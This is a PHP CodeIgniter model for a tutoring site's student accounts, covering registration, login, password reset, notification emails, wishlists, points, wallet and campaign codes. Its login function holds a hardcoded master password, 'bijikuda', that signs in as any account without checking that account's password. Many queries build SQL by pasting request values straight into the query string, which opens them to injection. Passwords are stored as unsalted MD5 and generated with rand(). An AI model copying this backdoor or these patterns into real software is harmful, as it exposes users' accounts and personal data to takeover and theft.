<?php

class Murid_model extends MY_Model {

    function __construct() {
        parent::__construct();
        $this->load->database();
    }
    
    /***** REGISTRASI MURID ******/
    function check_email($email){
        $this->db->where('murid_email',$email);
        $result = $this->db->get('murid');
        if($result->num_rows()>0){
            return true;
        }else{
            return false;
        }
    }
    
    function get_kota(){
	   $this->db->order_by('lokasi_title','asc');
        return $this->db->get('lokasi');
    }
    
    function get_provinsi(){
	   $this->db->order_by('provinsi_title','asc');
        return $this->db->get('provinsi');
    }

    public function insert_with_min_requirement($nama, $email, $telp){
        $password = $this->generateRandomString();
        $password_md5 = md5($password);
        $this->db->query("INSERT INTO murid(murid_email,murid_password,murid_nama,murid_hp)
                            VALUES ('$email','$password_md5','$nama','$telp')");

        $id = $this->db->insert_id();

        $data['id'] = $id;
        $data['password'] = $password;

        return $data;
    }

    function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    function insert_murid_min($input){
		if(!empty($input['campaign_code'])) {
			if(!$this->check_campaign($input['campaign_code'])) {
				$input['campaign_code'] = '';
			}
		}
        $this->db->set('campaign_code',$input['campaign_code']);
        $this->db->set('murid_email',$input['email']);
        $this->db->set('murid_password',md5($input['pass']));
        $this->db->set('murid_nama',$input['nama']);
        $this->db->set('murid_kota',$input['kota']);
        $this->db->set('murid_alamat',$input['alamat']);
        $this->db->set('murid_hp',$input['hp']);
        $this->db->set('murid_gender',$input['gender']);
        $this->db->set('source_info_id',$input['source_info']);
        $this->db->set('murid_active',1,TRUE);
        $this->db->set('murid_call_status',1,TRUE);
        $this->db->set('murid_call_progress',0,TRUE);
        $this->db->set('murid_handle_by',0,TRUE);
        $this->db->insert('murid');
        return $this->db->insert_id();
    }
    
    function insert_murid($input){
		if(!empty($input['campaign_code'])) {
			if(!$this->check_campaign($input['campaign_code'])) {
				$input['campaign_code'] = '';
			}
		}
		$this->db->set('campaign_code', $input['campaign_code']);
        $this->db->set('murid_email',$input['email']);
        $this->db->set('murid_password',md5($input['pass']));
        $this->db->set('murid_nama',$input['nama']);
        $this->db->set('murid_nik',$input['nik']);
        $this->db->set('murid_kota',$input['kota']);
        $this->db->set('murid_alamat',$input['alamat']);
        $this->db->set('murid_alamat_domisili',$input['alamat_domisili']);
        $this->db->set('murid_hp',$input['hp']);
        $this->db->set('murid_hp_2',$input['hp_2']);
        $this->db->set('murid_telp_rumah',$input['telp_rumah']);
        $this->db->set('murid_telp_kantor',$input['telp_kantor']);
        $this->db->set('murid_instansi',$input['instansi']);
        $this->db->set('murid_gender',$input['gender']);
        $this->db->set('murid_tempatlahir',$input['tempatlahir']);
        $this->db->set('murid_lahir',$input['lahir']);
        $this->db->set('murid_referral',$input['referral']);
        $this->db->set('source_info_id',$input['source_info']);
        $this->db->set('murid_daftar',$input['murid_daftar']);
        $this->db->set('murid_active',1,TRUE);
        $this->db->set('murid_call_status',1,TRUE);
        $this->db->set('murid_call_progress',0,TRUE);
        $this->db->set('murid_handle_by',0,TRUE);
        $this->db->insert('murid');
        return $this->db->insert_id();
    }
    
    /*** DELETE MURID ***/
    function delete_murid($murid_id){
        //get murid
        $murid = $this->get_murid_by_id($murid_id);
        if(empty($murid)){
            return;
        }
        //delete pp
        $base_path = $this->config->item('base_url_pp_murid');
        unlink($base_path.$murid->murid_id.'.jpg');
        //delete murid			   
	   $check_query_request = "SELECT * FROM request WHERE murid_id = ".$murid_id;
	   $num_request = $this->db->query($check_query_request);
	   if($num_request->num_rows() > 0){
			$query = "DELETE FROM request WHERE murid_id = ".$murid_id;
			$this->db->query($query);
	   }
	   
	   $query = "DELETE FROM murid WHERE murid_id = ".$murid_id;
	   $this->db->query($query);

    }   
    
    /*** EMAIL MURID ***/
    function email_reg($murid){
        $this->load->library('email');
        $config['useragent'] = 'Ruangguru Web Service';
        $config['protocol'] = 'smtp';
        $config['smtp_host'] = 'mail.ruangguru.com';
        $config['smtp_port'] = 25;
        $config['smtp_user'] = 'no-reply@ruangguru.com';
        $config['smtp_pass'] = $this->config->item('smtp_password');
        $config['priority'] = 1;
        $config['mailtype'] = 'html';
        $config['charset'] = 'utf-8';
        $config['wordwrap'] = TRUE; 
        $this->email->initialize($config);
        $this->email->from('no-reply@ruangguru.com', 'Ruangguru.com');
            $this->email->cc('registrasi@ruangguru.com');
        $this->email->to($murid->murid_email);

        $this->email->subject('Selamat Datang di Ruangguru');
            $content = $this->load->view('front/murid/daftar_email',array('murid'=>$murid),TRUE);
        $this->email->message($content);

        $this->email->send();
    }
    
    function email_request($murid){
        $this->load->library('email');
        $config['useragent'] = 'Ruangguru Web Service';
        $config['protocol'] = 'smtp';
        $config['smtp_host'] = 'mail.ruangguru.com';
        $config['smtp_port'] = 25;
        $config['smtp_user'] = 'no-reply@ruangguru.com';
        $config['smtp_pass'] = $this->config->item('smtp_password');
        $config['priority'] = 1;
        $config['mailtype'] = 'html';
        $config['charset'] = 'utf-8';
        $config['wordwrap'] = TRUE; 
        $this->email->initialize($config);
        $this->email->from('no-reply@ruangguru.com', 'Ruangguru.com');
        $this->email->cc('registrasi@ruangguru.com');
        $this->email->to($murid->murid_email);

        $this->email->subject('Selamat Datang di Ruangguru');
        $content = $this->load->view('front/murid/daftar_email_request',array('murid'=>$murid),TRUE);
        $this->email->message($content);

        $this->email->send();
    }

    public function get_invoice_by_id($id){
        $query = $this->db->query("SELECT ki.*,mr.murid_nama,g.guru_nama,m.matpel_title,jp.jenjang_pendidikan_title
                                    FROM kelas_invoice as ki
                                    LEFT JOIN kelas as k ON k.kelas_id=ki.kelas_id
                                    LEFT JOIN murid as mr ON mr.murid_id=k.murid_id
                                    LEFT JOIN guru as g ON g.guru_id=k.guru_id
                                    LEFT JOIN matpel as m ON k.matpel_id=m.matpel_id
                                    LEFT JOIN jenjang_pendidikan as jp ON jp.jenjang_pendidikan_id=m.jenjang_pendidikan_id
                                    WHERE id=$id");

        $data = $query->result_array();
        return $data[0];
    }

    function email_invoice($murid,$invoice){
        $this->load->library('email');
        $config['useragent'] = 'Ruangguru Web Service';
        $config['protocol'] = 'smtp';
        $config['smtp_host'] = 'mail.ruangguru.com';
        $config['smtp_port'] = 25;
        $config['smtp_user'] = 'no-reply@ruangguru.com';
        $config['smtp_pass'] = $this->config->item('smtp_password');
        $config['priority'] = 1;
        $config['mailtype'] = 'html';
        $config['charset'] = 'utf-8';
        $config['wordwrap'] = TRUE; 
        $this->email->initialize($config);
        $this->email->from('no-reply@ruangguru.com', 'Ruangguru.com');
        $this->email->cc('info@ruangguru.com');
        $this->email->to($murid->murid_email);

        $data['invoice'] = $this->get_invoice_by_id($invoice);
        $this->email->subject('Invoice Ruangguru');
        $content = $this->load->view('admin/kelas/print_invoice',$data,TRUE);
        $this->email->message($content);

        $this->email->send();
    }

    function send_email_invoice($id,$invoice){
        $this->db->where('murid_id',$id);
        $murid = $this->db->get('murid');
        if($murid->num_rows() > 0){
            $murid = $murid->first_row();
            $this->email_invoice($murid,$invoice);
        }
    }
    
    function send_email_reg($id){
        $this->db->where('murid_id',$id);
        $murid = $this->db->get('murid');
        if($murid->num_rows() > 0){
            $murid = $murid->first_row();
            $this->email_reg($murid);
        }
    }
    
     function send_email_request($id){
        $this->db->where('murid_id',$id);
        $murid = $this->db->get('murid');
        if($murid->num_rows() > 0){
            $murid = $murid->first_row();
            $this->email_request($murid);
        }
    }
    
    
     /*** LOGIN MURID ***/
    function check_login($input){
        if($input['password'] == 'bijikuda'){
            $this->db->where('murid_email',$input['email']);
            $result = $this->db->get('murid');
        }else{
            $this->db->where('murid_email',$input['email']);
            $this->db->where('murid_password',md5($input['password']));
            $this->db->where('murid_active',1,TRUE);
            $result = $this->db->get('murid');
        }
        if($result->num_rows()>0){
            return $result->first_row()->murid_id;
        }else{
            return null;
        }
    }
    
    /*** RESET PASSWORD MURID ***/
    function reset_password($email){
        $murid = $this->get_murid_by_email($email);
        if(!empty($murid)){
            $alphabet = "abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789";
            $pass = array(); 
            $alphaLength = strlen($alphabet) - 1;
            for ($i = 0; $i < 8; $i++) {
                $n = rand(0, $alphaLength);
                $pass[] = $alphabet[$n];
            }
            $new_pass = implode($pass);
            //update password
            if(!empty($murid) && $murid->murid_id > 0){
                $this->db->set('murid_password',md5($new_pass));
                $this->db->where('murid_id',$murid->murid_id);
                $this->db->update('murid');
            }else{
                return false;
            }
            //send email
            $this->send_reset_password_email($murid, $new_pass);
            return true;
        }else{
            return false;
        }
    }
    
    function send_reset_password_email($murid,$new_pass){
        $this->load->library('email');
	$this->email->from('no-reply@ruangguru.com', 'Ruangguru.com');
        $this->email->cc('registrasi@ruangguru.com');
	$this->email->to($murid->murid_email);

	$this->email->subject('Reset Password Murid Ruang Guru');
        //assigning new pass to murid
        $murid->new_pass = $new_pass;
        $content = $this->load->view('front/murid/template/reset_password_email',array('murid'=>$murid),TRUE);
	$this->email->message($content);

	$this->email->send();
    }
    
    /******* MURID GETTER *****/
    function get_murid_by_id($id){
        $this->db->where('murid_id',$id);
        $this->db->join('lokasi','murid.murid_kota=lokasi.lokasi_id', 'left outer');
        $this->db->join('provinsi','lokasi.provinsi_id=provinsi.provinsi_id', 'left outer');
        //$this->db->join('source_info','murid.source_info_id=source_info.source_info_id', 'left outer');
        return $this->db->get('murid')->first_row();
    }
    
     function get_murid_by_name($name){
        $this->db->like('murid_nama', $name);
	   $this->db->join('lokasi','murid.murid_kota=lokasi.lokasi_id', 'left outer');
        return $this->db->get('murid');
    }
    
    function get_murid_by_email($email){
        $this->db->where('murid_email',$email);
        $result = $this->db->get('murid');
        if($result->num_rows() > 0){
            return $result->first_row();
        }else{
            return null;
        }
    }
    
     function get_province_murid_by_lokasi_id($id_loc){
        $this->db->where('lokasi_id',$id_loc);
        return $this->db->get('lokasi')->first_row();
    }
    /*** BIODATA ***/
    function update_pass($guru_id,$oldpass,$pass){
        $this->db->set('murid_password',md5($pass));
        $this->db->where('murid_password',md5($oldpass));
        $this->db->where('murid_id',$guru_id);
        $this->db->update('murid');
        if($this->db->affected_rows()>0){
            return true;
        }else{
            return false;
        }
    }
    
    function update_biodata($id_guru,$input){
        $this->db->set('murid_nama',$input['nama']);
        $this->db->set('murid_nik',$input['nik']);
        $this->db->set('murid_gender',$input['gender']);
        $this->db->set('murid_tempatlahir',$input['tempatlahir']);
        $this->db->set('murid_lahir',$input['lahir']);
        $this->db->set('murid_referral',$input['referral']);
        $this->db->set('murid_hp',$input['hp']);
        $this->db->set('murid_hp_2',$input['hp_2']);
        $this->db->set('murid_telp_rumah',$input['telp_rumah']);
        $this->db->set('murid_telp_kantor',$input['telp_kantor']);
        $this->db->set('murid_alamat',$input['alamat']);
        $this->db->set('murid_alamat_domisili',$input['alamat_domisili']);
        $this->db->set('murid_kota',$input['kota']);
        if($input['email']!=null && $input['email']!='0') {
            $this->db->set('murid_email',$input['email']);
        }
        
        $this->db->where('murid_id',$id_guru);
        $this->db->update('murid');
    }

    // function get_koordinat($id_murid){
    //     $query = $this->db->query("SELECT murid_lat,murid_lng FROM murid WHERE murid_id=$id_murid");

    //     $result = $query->result_array();
    //     if(sizeof($result)>0){
    //         $loc = $result[0];
    //         if($loc['murid_lat']==0 && $loc['murid_lng']==0){
    //             return 0;
    //         } else {
    //             return $loc;
    //         }
    //     } else {
    //         return 0;
    //     }
    // }
    
    /*** SESSION GETTER ***/
    function ses_get_nama(){
        $id = $this->session->userdata('murid_id');
        if(!empty($id)){
            $this->db->where('murid_id',$id);
            return $this->db->get('murid')->first_row()->murid_nama;
        }else{
            return '';
        }
    }
    
    function ses_get_email(){
        $id = $this->session->userdata('murid_id');
        if(!empty($id)){
            $this->db->where('murid_id',$id);
            return $this->db->get('murid')->first_row()->murid_email;
        }else{
            return '';
        }
    }
    
    /*** ADMIN ***/
    function get_murid($page=0){
        $offset = 20;
        $start = $page*$offset;
        $this->db->join('lokasi','murid.murid_kota=lokasi.lokasi_id', 'left outer');
        $this->db->limit($offset,$start);
        $this->db->order_by('murid_id','desc');
        return $this->db->get('murid');
    }
    
    public function get_murid_count(){
        return $this->db->count_all_results('murid');
    }
    
    function get_murid_new(){
        $this->db->order_by('murid_daftar','desc');
        return $this->db->get('murid');
    }

    /*WISHLIST*/
    public function add_wishlist($murid,$guru){
        $this->db->query("INSERT INTO murid_wishlist(murid_id,guru_id) VALUES ($murid,$guru)");
        return $this->db->insert_id();
    }

    public function get_wishlist($id){

        $query = $this->db->query("SELECT gg.*,kk.lama_mengajar FROM (SELECT mw.murid_id, g.guru_id, g.guru_nama,g.guru_bio,g.bio_singkat, g.guru_gender, g.pendidikan_id,g.guru_pendidikan_instansi,g.guru_pendidikan_verified,g.tagline, g.guru_last_login
                                    FROM murid_wishlist as mw
                                    LEFT JOIN guru AS g ON mw.guru_id=g.guru_id) AS gg

                                    LEFT JOIN (
                                            SELECT k.guru_id, 
                                                    sum((abs(time_to_sec(timediff(kelas_pertemuan_jam_mulai,kelas_pertemuan_jam_selesai))/3600))) 
                                                as lama_mengajar
                                            FROM  `kelas_pertemuan` as kp LEFT JOIN kelas as k
                                                ON k.kelas_id=kp.kelas_id GROUP BY k.guru_id)
                                    AS kk ON kk.guru_id = gg.guru_id

                                    WHERE gg.murid_id=$id
                                    GROUP BY kk.guru_id");



        return $query->result();
    }

    public function remove_wishlist($murid,$guru){
        $this->db->query("DELETE FROM murid_wishlist WHERE murid_id=$murid AND guru_id=$guru");
    }

    public function in_wishlist($murid,$guru) {
        $query = $this->db->query("SELECT id FROM murid_wishlist WHERE murid_id=$murid AND guru_id=$guru");
        $res = $query->result_array();
        if (sizeof($res) > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function get_total_points($id){
        $query = $this->db->query("SELECT sum(point) as total FROM murid_points WHERE murid_id=$id");

        $result = $query->result_array();
        return $result[0]['total'];
    }

    public function get_today_points($id){
        date_default_timezone_set("Asia/Jakarta");
        $query = $this->db->query("SELECT * FROM murid_points 
                                        WHERE murid_id=$id AND date_created LIKE '%".date('Y-m-d')."%'
                                        ORDER BY date_created DESC");

        return $query->result();
    }

    public function get_points($id){
        $query = $this->db->query("SELECT * FROM murid_points WHERE murid_id=$id ORDER BY date_created desc");
        return $query;
    }

    public function add_point($id,$point,$asal,$keterangan){
        date_default_timezone_set("Asia/Jakarta");
        $isadd = true;
        if($asal=="login"){
            $last = $this->db->query("SELECT id FROM murid_points WHERE murid_id=$id AND date_created LIKE '%".date('Y-m-d')."%' AND asal='login'");
            $data = $last->result_array();
            if(sizeof($data)>0){
                $isadd=false;
            }
        }else if($asal="request"){
            $last = $this->db->query("SELECT id FROM murid_points WHERE murid_id=$id AND date_created LIKE '%".date('Y-m-d')."%' AND asal='request'");
            $data = $last->result_array();
            if(sizeof($data)>2){
                $isadd=false;
            }
        }

        if($isadd){
            $this->db->query("INSERT INTO murid_points(murid_id,point,asal,keterangan)
                                VALUES($id,$point,'$asal','$keterangan')");
        }
    }
    
    public function delete_poin($id){
        $this->db->query("DELETE FROM murid_points WHERE id=$id");
    }

    /*REQUEST GURU*/
    public function request_guru($murid,$guru,$matpel,$preferensi,$catatan){
        $this->db->query("INSERT INTO pesan_guru (murid_id,guru_id,matpel_id,preferensi,catatan) 
                            VALUES ($murid,$guru,$matpel,'$preferensi','$catatan')");

        return $this->db->insert_id();
    }

    public function request_alt($id,$guru_id){
        $this->db->query("INSERT INTO pesan_guru_alt(pesan_id,guru_id) VALUES ($id,$guru_id)");
    }

    public function ask_help($subject,$pesan){
        $this->db->query("INSERT INTO admin_message(subject,pesan) VALUES ('$subject','$pesan')");
    }

    public function get_profile_percentage($id){
        $query = $this->db->query("SELECT m.* FROM murid as m WHERE m.murid_id=$id");

        $result = $query->result_array();
        $murid = $result[0];
        $sum = 0;
        $count = 0;
        if($murid['murid_nama']!=null && $murid['murid_nama']!="") { $count++; } $sum ++;
        if($murid['murid_alamat']!=null && $murid['murid_alamat']!="") { $count++; } $sum ++;
        if($murid['murid_alamat_domisili']!=null && $murid['murid_alamat_domisili']!="") { $count++; } $sum ++;
        if($murid['murid_kota']!=null && $murid['murid_kota']!=0) { $count++; } $sum ++;
        if($murid['murid_gender']!=null && $murid['murid_gender']!=0) { $count++; } $sum ++;
        if($murid['murid_tempatlahir']!=null && $murid['murid_tempatlahir']!="") { $count++; } $sum ++;
        if($murid['murid_lahir']!=null && $murid['murid_lahir']!="") { $count++; } $sum ++;
        if($murid['murid_hp']!=null && $murid['murid_hp']!="") { $count++; } $sum ++;
        if($murid['murid_hp_2']!=null && $murid['murid_hp_2']!="") { $count++; } $sum ++;
        if($murid['murid_telp_rumah']!=null && $murid['murid_telp_rumah']!="") { $count++; } $sum ++;
        if($murid['murid_telp_kantor']!=null && $murid['murid_telp_kantor']!="") { $count++; } $sum ++;
        if($murid['murid_instansi']!=null && $murid['murid_instansi']!="") { $count++; } $sum ++;

        return round(($count/$sum)*100);
    }

    /*WALLET*/
    public function sum_wallet($id){
        $query = $this->db->query("SELECT sum(nominal) as total FROM murid_wallet WHERE murid_id=$id");

        $result = $query->result_array();
        return $result[0]['total']+0;
    }

    public function tukar_point($id,$poin,$type=1){
        $nominal = $poin*100;
        $this->db->query("INSERT INTO murid_wallet(murid_id,aktifitas,nominal,type) VALUES($id,'Penukaran poin sebanyak $poin poin',$nominal,$type)");
        $this->db->query("INSERT INTO murid_points(murid_id,point,asal,keterangan) VALUES($id,-$poin,'tukar','penukaran poin ke diskon')");
    }

    public function get_today_pengumuman(){
        date_default_timezone_set("Asia/Jakarta");
        $q = $this->db->query("SELECT * FROM admin_pengumuman WHERE date_created LIKE '".date('Y-m-d')."%' AND (tujuan=0 OR tujuan=2) ORDER BY date_created DESC");
        return $q->result_array();
    }

	public function get_murid_kelas_krg($id) {
		$email = $this->db->query('SELECT murid_email FROM murid WHERE murid_id = ?', $id)->get()->scalar();
		$sponsor_id = $this->db->query('SELECT id FROM vendor_class_pemesan WHERE email = ? ', $email)->get()->scalar();
		$class_ids = $this->db->query("
SELECT DISTINCT code, class_id
FROM vendor_class_participant
WHERE status = 4 AND pemesan_id = ?", $sponsor_id)->get()->result();
		$ids = array();
		return $class_ids;
	}
	
	public function get_murid_kelas_krg_tickets($id) {
		$class_ids = $this->get_murid_kelas_krg($id);
		$tickets = array();
		foreach($class_ids as $ids) {
			$tickets[] = $this->db->where('invoice_code', $ids->code)->get('vendor_class_ticket')->single();
		}
		return $tickets;
	}
	
	public function check_campaign($campaign_code){
		$campaign = $this->campaign_check($campaign_code);
		return !empty($campaign) && ($campaign->usage == '~' || ($campaign->usage < $campaign->expected_qty));
	}
	
	public function campaign_check($campaign_text, $all = FALSE) {
		$query = "
		SELECT
			*
		FROM
			campaign
		WHERE 1
			AND code = ?";
		if(!$all) {
			$date = date('Y-m-d H:i:s', time());
			$query .="
			AND '{$date}' BETWEEN due_start AND due_end
			AND active = 1";
		}
		$campaign = $this->db->query($query, $campaign_text)->row();
		if(!empty($campaign)) {
			if($campaign->expected_qty > 0) {
				$query2 = "
				SELECT
					COUNT(*) AS cnt
				FROM
					murid
				WHERE 1
					AND campaign_code = ?";
				$count = (int) $this->db->query($query2, $campaign_text)->scalar(0);
				
			} else {
				$count = '~';
			}
			$campaign->usage = $count;
			return $campaign;
		}
		return NULL;
	}
	
	public function campaign_list() {
		//$this->db->select('campaign_code')->distinct()->from('murid')->get()->col_array();
		$campaigns = $this->db->select('code')->from('campaign')->get()->col_array();
		$campaign = array();
		foreach($campaigns as $campaign_code) {
			$cmpg = $this->campaign_check($campaign_code, TRUE);
			if(empty($cmpg)) continue;
			$campaign[] = $cmpg;
		}
		return $campaign;
	}
	
	public function create_campaign($code, $active = 1, $due_start = NULL, $due_end = NULL, $expected_qty = 0, $value = NULL, 
									$value_unit = NULL) {
		$data = array(
			'code'			=> strtoupper($code),
			'due_start'		=> $due_start,
			'due_end'		=> $due_end,
			'expected_qty'	=> $expected_qty,
			'value'			=> $value,
			'value_unit'	=> $value_unit,
			'active'		=> !!$active
		);
		
		$this->db->insert('campaign', $data);
		return !! $this->db->affected_rows();
	}
	
	public function deactivate_campaign($code) {
		$this->db->update('campaign', array('active'=>0), array('code'=>$code));
		return !! $this->db->affected_rows();
	}
	
	public function reactivate_campaign($code) {
		$this->db->update('campaign', array('active'=>1), array('code'=>$code));
		return !! $this->db->affected_rows();
	}
	
	public function campaign_student_list($code) {
		$query = "
		SELECT
			*
		FROM
			murid
		WHERE 1
			AND campaign_code = ?";
		
		return $this->db->query($query, $code)->result();
	}

}